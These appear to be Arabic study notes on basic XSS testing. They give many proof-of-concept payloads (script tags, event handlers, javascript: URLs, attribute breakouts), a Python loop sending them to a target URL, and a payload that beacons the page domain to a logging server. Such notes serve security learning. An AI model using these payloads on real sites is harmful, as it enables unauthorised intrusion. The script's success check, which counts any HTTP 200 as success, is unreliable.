
## الخطوات العملية للحقن الأساسية
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة وتعديل الطلبات.
   - حدد حقل إدخال يُحتمل أن يكون عرضة لـ XSS (مثل حقل البحث، نموذج التعليقات، أو معلمة URL مثل `?search=`).
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console) والتغييرات في الـ DOM.

2. **اختبار نقطة الإدخال**:
   - أدخل شيفرة اختبار بسيطة (مثل `<test>` أو `"><test>`) للتحقق مما إذا كان الإدخال يُعرض كـ HTML أو يُنفذ كشيفرة.
   - إذا ظهر `<test>` كجزء من الصفحة أو أثر على بنية HTML، فهذا يشير إلى احتمالية وجود XSS.

3. **إدخال الحقن الأساسية**:
   - ابدأ بحقنة بسيطة مثل `<script>alert('XSS')</script>` في حقل إدخال أو معلمة URL.
   - جرب الحقن في سياقات مختلفة:
     - معلمات URL: `https://example.com/search?query=<script>alert('XSS')</script>`
     - حقول نماذج: أدخل `<img src=x onerror=alert(1)>` في حقل تعليق.
     - سمات HTML: `<input value="><script>alert('XSS')</script>">`.
   - استخدم وسوم وأحداث شائعة (مثل `<script>`, `onerror`, `onload`).

4. **مراقبة الاستجابات**:
   - تحقق من نجاح الحقن بناءً على:
     - **نجاح (True)**: ظهور تنبيه (مثل `alert('XSS')`)، تسجيل رسالة في وحدة التحكم (مثل `console.log('XSS')`)، تغيير عنوان الصفحة، أو تغيير بصري (مثل لون الخلفية).
     - **فشل (False)**: لا يحدث شيء، ظهور خطأ (مثل رمز حالة 403)، أو تصفية الإدخال.
   - استخدم أدوات المطورين (F12) للتحقق من وحدة التحكم أو التغييرات في الـ DOM.

5. **تجربة صيغ مختلفة**:
   - إذا فشلت الحقنة الأولى، جرب صيغًا أخرى (مثل `<script>alert(document.domain)</script>` أو `<svg onload=alert(1)>`).
   - اختبر نقاط إدخال متعددة (مثل حقول نماذج أخرى أو معلمات URL مختلفة).
   - جرب حقنًا بدون تنبيهات (مثل `<script>console.log('XSS')</script>`) لتجنب إزعاج المستخدم.

6. **تأكيد النطاق (اختياري)**:
   - استخدم حقن تكشف نطاق التنفيذ (مثل `<script>alert(document.domain)</script>` أو `<script>alert(window.origin)</script>`).
   - تحقق مما إذا كانت الثغرة في بيئة معزولة (مثل iframe أو sandbox).





---

## جميع المحاولات الممكنة للحقن الأساسية
في الحقن الأساسية، المحاولات تركز على شيفرات JavaScript واضحة وبسيطة لتأكيد وجود ثغرة XSS. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي باستخدام حقول الإدخال أو Burp Suite Repeater.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر حقل إدخال (مثل البحث أو التعليقات) أو باستخدام Burp Suite Repeater. الهدف هو تنفيذ شيفرة JavaScript واضحة لتأكيد الثغرة.

#### أ. وسوم `<script>`
{ #XSS_with_out_alret  / #XSS_Idea_for_script_tag / #XSS_Basic_psyloads }
استخدام وسم `<script>` لتنفيذ شيفرة JavaScript مباشرة.
- **الحقن**: `<script>alert('XSS')</script>`
  - **الإدخال**: أدخل في حقل بحث أو تعليق: `<script>alert('XSS')</script>`
  - **كيف يعمل**: يُنفذ تنبيه يعرض "XSS"، مؤكدًا وجود الثغرة.
  - **متى يُستخدم؟**: كاختبار أولي للتحقق من تنفيذ JavaScript.
- **الحقن**: `<script>alert(document.domain)</script>`
  - **الإدخال**: `https://example.com/search?query=<script>alert(document.domain)</script>`
  - **كيف يعمل**: يعرض النطاق (مثل `example.com`)، مؤكدًا سياق التنفيذ.
  - **متى يُستخدم؟**: للتحقق من النطاق والبيئات المعزولة.
- **الحقن**: `<script>alert(window.origin)</script>`
  - **الإدخال**: أدخل في نموذج: `<script>alert(window.origin)</script>`
  - **كيف يعمل**: يعرض أصل الصفحة (مثل `https://example.com`)، مؤكدًا السياق.
  - **متى يُستخدم؟**: لتأكيد نطاق التنفيذ.
- **الحقن**: `<script>console.log('XSS')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>console.log('XSS')</script>`
  - **كيف يعمل**: يسجل "XSS" في وحدة التحكم، غير مزعج.
  - **متى يُستخدم؟**: لتأكيد التنفيذ دون تنبيهات.
- **الحقن**: `<script>debugger;</script>`
  - **الإدخال**: أدخل في حقل: `<script>debugger;</script>`
  - **كيف يعمل**: يوقف التنفيذ في أدوات المطورين، مؤكدًا تشغيل الشيفرة.
  - **متى يُستخدم؟**: لاختبار التنفيذ مع أدوات المطورين مفتوحة.
- **الحقن**: `<script>alert(1)</script>`
  - **الإدخال**: `https://example.com/search?query=<script>alert(1)</script>`
  - **كيف يعمل**: يُنفذ تنبيه رقمي بسيط لتجنب فلاتر النصوص.
  - **متى يُستخدم؟**: عند الاشتباه بوجود فلاتر تحظر النصوص.
- **الحقن**: `<script>confirm('XSS')</script>`
  - **الإدخال**: أدخل في نموذج: `<script>confirm('XSS')</script>`
  - **كيف يعمل**: يفتح نافذة تأكيد، محاكيًا تفاعل المستخدم.
  - **متى يُستخدم؟**: لاختبار بدائل `alert`.
- **الحقن**: `<script>prompt('أدخل بيانات:','XSS')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>prompt('أدخل بيانات:','XSS')</script>`
  - **كيف يعمل**: يفتح نافذة إدخال، محاكيًا التقاط بيانات.
  - **متى يُستخدم؟**: لاختبار تفاعلات المستخدم.

#### ب. سمات الأحداث
{  #XSS_Idea_for_Img_tag / #XSS_Basic_psyloads / #XSS--ALL--Event--Payload  / #XSS_Idea_for_SVG_tag }
##### شرح لها ==> 
![[Recording 20250509031755.m4a]]

استخدام سمات الأحداث (مثل `onerror`, `onload`) لتشغيل JavaScript.
- **الحقن**: `<img src=x onerror=alert('XSS')>`
  - **الإدخال**: أدخل في حقل تعليق: `<img src=x onerror=alert('XSS')>`
  - **كيف يعمل**: يُنفذ التنبيه عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<script>`.
- **الحقن**: `<img src=x onerror=alert(document.domain)>`
  - **الإدخال**: `https://example.com/search?query=<img src=x onerror=alert(document.domain)>`
  - **كيف يعمل**: يعرض النطاق عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لتأكيد السياق والنطاق.
- **الحقن**: `<img src=x onerror=console.log('XSS')>`
  - **الإدخال**: أدخل في نموذج: `<img src=x onerror=console.log('XSS')>`
  - **كيف يعمل**: يسجل "XSS" في وحدة التحكم عند فشل الصورة.
  - **متى يُستخدم؟**: لتأكيد التنفيذ دون تنبيه.
- **الحقن**: `<body onload=alert('XSS')>`
  - **الإدخال**: أدخل في حقل يتحكم في `<body>`: `<body onload=alert('XSS')>`
  - **كيف يعمل**: يُنفذ التنبيه عند تحميل الصفحة.
  - **متى يُستخدم؟**: إذا كنت تتحكم في وسم `<body>`.
- **الحقن**: `<input autofocus onfocus=alert(1)>`
  - **الإدخال**: أدخل في نموذج: `<input autofocus onfocus=alert(1)>`
  - **كيف يعمل**: يُنفذ التنبيه عند تركيز المؤشر على الحقل.
  - **متى يُستخدم؟**: في النماذج التفاعلية.
- **الحقن**: `<svg onload=alert('XSS')>`
  - **الإدخال**: أدخل في تعليق: `<svg onload=alert('XSS')>`
  - **كيف يعمل**: يُنفذ التنبيه عند تحميل عنصر SVG.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<script>`.
- **الحقن**: `<video poster=x onerror=alert(1)>`
  - **الإدخال**: أدخل في حقل: `<video poster=x onerror=alert(1)>`
  - **كيف يعمل**: يُنفذ التنبيه عند فشل تحميل صورة الفيديو.
  - **متى يُستخدم؟**: لاختبار وسوم HTML5.
- **الحقن**: `<a href="javascript:alert('XSS')">اضغط هنا</a>`
  - **الإدخال**: أدخل في تعليق: `<a href="javascript:alert('XSS')">اضغط هنا</a>`
  - **كيف يعمل**: يُنفذ التنبيه عند النقر على الرابط.
  - **متى يُستخدم؟**: لاختبار الروابط.
- **الحقن**: `<div onclick=alert('XSS')>اضغط هنا</div>`
  - **الإدخال**: أدخل في نموذج: `<div onclick=alert('XSS')>اضغط هنا</div>`
  - **كيف يعمل**: يُنفذ التنبيه عند النقر على العنصر.
  - **متى يُستخدم؟**: لاختبار الأحداث التفاعلية.
- **الحقن**: `<iframe src=javascript:alert('XSS')></iframe>`
  - **الإدخال**: أدخل في حقل: `<iframe src=javascript:alert('XSS')></iframe>`
  - **كيف يعمل**: يُنفذ التنبيه عبر مصدر الـ iframe.
  - **متى يُستخدم؟**: في سياقات تسمح بـ iframes.

 - **الحقن**: `javascript:onclick=alert(1);`
	 امتي استخدم ال payload ده ==>  [[شرح فديوهات لل الخطوة  2   Basic XSS Payloads#تاني ملحوظه هامه جدا في ثغره ال Xss]]

#### ج. حقن بدون تنبيهات
{  #XSS_with_out_alret /  }
استخدام شيفرات لا تُنتج تنبيهات لتأكيد التنفيذ بطريقة أقل إزعاجًا.
- **الحقن**: `<script>console.log('XSS')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>console.log('XSS')</script>`
  - **كيف يعمل**: يسجل "XSS" في وحدة التحكم.
  - **متى يُستخدم؟**: لتأكيد التنفيذ دون إزعاج المستخدم.
- **الحقن**: `<script>console.error('XSS: ' + document.domain)</script>`
  - **الإدخال**: `https://example.com/search?query=<script>console.error('XSS: ' + document.domain)</script>`
  - **كيف يعمل**: يسجل خطأ في وحدة التحكم مع النطاق.
  - **متى يُستخدم؟**: لتأكيد التنفيذ مع معلومات النطاق   - **الإدخال**: أدخل في حقل: `<script>console.error('XSS: ' + document.domain)</script>`
  - **كيف يعمل**: يسجل خطأ في وحدة التحكم مع النطاق.
  - **متى يُستخدم؟**: لتأكيد التنفيذ مع زيادة الوضوح.
- **الحقن**: `<script>throw new Error('XSS')</script>`
  - **الإدخال**: أدخل في نموذج: `<script>throw new Error('XSS')</script>`
  - **كيف يعمل**: يُطلق خطأ في وحدة التحكم.
  - **متى يُستخدم؟**: لتأكيد التنفيذ عبر أخطاء وحدة التحكم.
- **الحقن**: `<script>document.title='XSS'</script>`
  - **الإدخال**: أدخل في تعليق: `<script>document.title='XSS'</script>`
  - **كيف يعمل**: يغير عنوان الصفحة إلى "XSS".
  - **متى يُستخدم؟**: لتأكيد التنفيذ بتغيير بصري.
- **الحقن**: `<script>document.body.style.background='red'</script>`
  - **الإدخال**: أدخل في حقل: `<script>document.body.style.background='red'</script>`
  - **كيف يعمل**: يغير لون خلفية الصفحة إلى الأحمر.
  - **متى يُستخدم؟**: لتأكيد التنفيذ بتغيير بصري واضح.
- **الحقن**: `<script>new Image().src='http://localhost/log?c='+document.domain</script>`
  - **الإدخال**: `https://example.com/search?query=<script>new Image().src='http://localhost/log?c='+document.domain</script>`
  - **كيف يعمل**: يرسل النطاق إلى خادم خارجي (يتطلب خادمًا للتسجيل).
  - **متى يُستخدم؟**: لتأكيد التنفيذ مع إرسال بيانات.

#### د. اختبار سياقات الإدخال
{ #Inline_HTML_Injection /  }
اختبار الحقن في سياقات محددة (مثل السمات أو عناوين URL).
- **الحقن**: `"><script>alert('XSS')</script>`
  - **الإدخال**: أدخل في حقل نموذج: `"><script>alert('XSS')</script>`
  - **كيف يعمل**: يخرج من سمة HTML (مثل `value`) ويُنفذ الشيفرة.
  - **متى يُستخدم؟**: عند اختبار الخروج من السمات.
- **الحقن**: `onerror=alert(1)`
  - **الإدخال**: أدخل في حقل يُستخدم كسمة: `onerror=alert(1)`
  - **كيف يعمل**: يُنفذ التنبيه كسمة حدث.
  - **متى يُستخدم؟**: في سياقات السمات.
- **الحقن**: `" autofocus onfocus=alert(1)//`
  - **الإدخال**: أدخل في حقل إدخال: `" autofocus onfocus=alert(1)//`
  - **كيف يعمل**: يخرج من قيمة إدخال ويُنفذ عند التركيز.
  - **متى يُستخدم؟**: في حقول النماذج.
- **الحقن**: `javascript:alert(1)//`
  - **الإدخال**: أدخل في حقل يُستخدم كـ URL: `javascript:alert(1)//`
  - **كيف يعمل**: يُنفذ التنبيه كعنوان JavaScript.
  - **متى يُستخدم؟**: في سياقات عناوين URL.

#### ط . استخدام payload في شكل صفحه html 
{  #XSS_exploit  }
##### اول حاجه بروح اعمل ملف فيه ال payload```

```bash
echo "alert(1)" > xss.js
```

##### ثاني حاجه اعملها اني اعمل موقع علي جهازي بالامر ده لازم تعمل الامر الاتي في المجلد اللي فيه الملف 

```bash
python -m http.server 80 
```


---
### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests`) لأتمتة اختبار مجموعة من الحقن الأساسية وتحليل الاستجابات. الهدف هو تسريع العملية عند اختبار نقاط إدخال متعددة.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن الأساسية.
  - مثال قائمة:
    ```
    <script>alert('XSS')</script>
    <script>alert(document.domain)</script>
    <img src=x onerror=alert('XSS')>
    <svg onload=alert(1)>
    <script>console.log('XSS')</script>
    <script>document.body.style.background='red'</script>
    ```
- **كيف يعمل**:
  - يتم إرسال كل حقنة عبر طلب HTTP (GET أو POST).
  - يتم تحليل الاستجابة (مثل رمز الحالة، طول الصفحة، أو نص معين) لتأكيد النجاح.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python):
  ```python
  import requests

  url = "https://example.com/search?query="
  payloads = [
      "<script>alert('XSS')</script>",
      "<script>alert(document.domain)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert(1)>",
      "<script>console.log('XSS')</script>",
      "<script>document.body.style.background='red'</script>"
  ]

  for payload in payloads:
      response = requests.get(url + payload)
      if "XSS" in response.text or response.status_code == 200:
          print(f"نجاح: {payload}")
      else:
          print(f"فشل: {payload}")
  ```
- **كيف يعمل**:
  - يرسل كل حقنة إلى URL المستهدف.
  - يتحقق من وجود "XSS" في الاستجابة أو رمز حالة 200 لتأكيد النجاح.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار سريع وآلي.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **رمز الحالة**: 200 (نجاح) مقابل 403/404 (فشل).
    - **طول الصفحة**: صفحة أطول قد تشير إلى نجاح.
    - **نص معين**: مثل "XSS" أو "error" في الاستجابة.
  - مثال: إذا أعادت `<script>alert('XSS')</script>` تنبيهًا أو نص "XSS"، فهي ناجحة.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد الحقن الأكثر فعالية بسرعة.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<script>confirm('XSS')</script>` أو `<video poster=x onerror=alert(1)>`).
  - جرب وسوم HTML5 أخرى (مثل `<audio>`, `<details>`).
  - اختبر أحداث إضافية (مثل `onclick`, `onmouseover`).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<script>prompt('أدخل بيانات:','XSS')</script>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. وسوم <script>:
- <script>alert('XSS')</script>: يُنفذ تنبيه يعرض "XSS".
- <script>alert(document.domain)</script>: يعرض النطاق (مثل example.com).
- <script>alert(window.origin)</script>: يعرض أصل الصفحة (مثل https://example.com).
- <script>console.log('XSS')</script>: يسجل "XSS" في وحدة التحكم.
- <script>debugger;</script>: يوقف التنفيذ في أدوات المطورين.
- <script>alert(1)</script>: يُنفذ تنبيه رقمي لتجنب فلاتر النصوص.
- <script>confirm('XSS')</script>: يفتح نافذة تأكيد.
- <script>prompt('أدخل بيانات:','XSS')</script>: يفتح نافذة إدخال.

2. سمات الأحداث:
- <img src=x onerror=alert('XSS')>: يُنفذ التنبيه عند فشل تحميل الصورة.
- <img src=x onerror=alert(document.domain)>: يعرض النطاق عند فشل الصورة.
- <img src=x onerror=console.log('XSS')>: يسجل "XSS" عند فشل الصورة.
- <body onload=alert('XSS')>: يُنفذ التنبيه عند تحميل الصفحة.
- <input autofocus onfocus=alert(1)>: يُنفذ التنبيه عند تركيز الحقل.
- <svg onload=alert('XSS')>: يُنفذ التنبيه عند تحميل SVG.
- <video poster=x onerror=alert(1)>: يُنفذ التنبيه عند فشل صورة الفيديو.
- <a href="javascript:alert('XSS')">اضغط هنا</a>: يُنفذ التنبيه عند النقر.
- <div onclick=alert('XSS')>اضغط هنا</div>: يُنفذ التنبيه عند النقر.
- <iframe src=javascript:alert('XSS')></iframe>: يُنفذ التنبيه عبر iframe.

3. حقن بدون تنبيهات:
- <script>console.log('XSS')</script>: يسجل "XSS" في وحدة التحكم.
- <script>console.error('XSS: ' + document.domain)</script>: يسجل خطأ مع النطاق.
- <script>throw new Error('XSS')</script>: يُطلق خطأ في وحدة التحكم.
- <script>document.title='XSS'</script>: يغير عنوان الصفحة إلى "XSS".
- <script>document.body.style.background='red'</script>: يغير لون الخلفية إلى الأحمر.
- <script>new Image().src='http://localhost/log?c='+document.domain</script>: يرسل النطاق إلى خادم.

4. اختبار سياقات الإدخال:
- "><script>alert('XSS')</script>: يخرج من سمة HTML ويُنفذ الشيفرة.
- onerror=alert(1): يُنفذ كسمة حدث.
- " autofocus onfocus=alert(1)//: يخرج من قيمة إدخال ويُنفذ عند التركيز.
- javascript:alert(1)//: يُنفذ كعنوان JavaScript.



---

**نصائح إضافية**:
- **اختبار نقاط إدخال متعددة**: جرب معلمات URL، حقول النماذج، الرؤوس (مثل User-Agent)، والمدخلات المخفية.
- **تأكيد التنفيذ**: ابحث عن تنبيهات، تسجيلات في وحدة التحكم، توقف التصحيح، أو تغييرات بصرية.
- **التحقق من النطاق**: استخدم `document.domain` أو `window.origin` لمعرفة ما إذا كان الـ XSS في بيئة معزولة.
- **الانتقال إلى التعقيد**: إذا فشلت الحقن الأساسية، انتقل إلى الحقن المعقدة (مثل التشفير أو تقسيم الكلمات).
- **الأدوات**: استخدم Burp Suite لاعتراض الطلبات وأدوات المطورين (F12) لمراقبة وحدة التحكم والـ DOM.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء).

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب، أو التركيز على سياق معين (مثل XSS المنعكس أو المخزن)، أخبرني وسأقدم ردًا مخصصًا!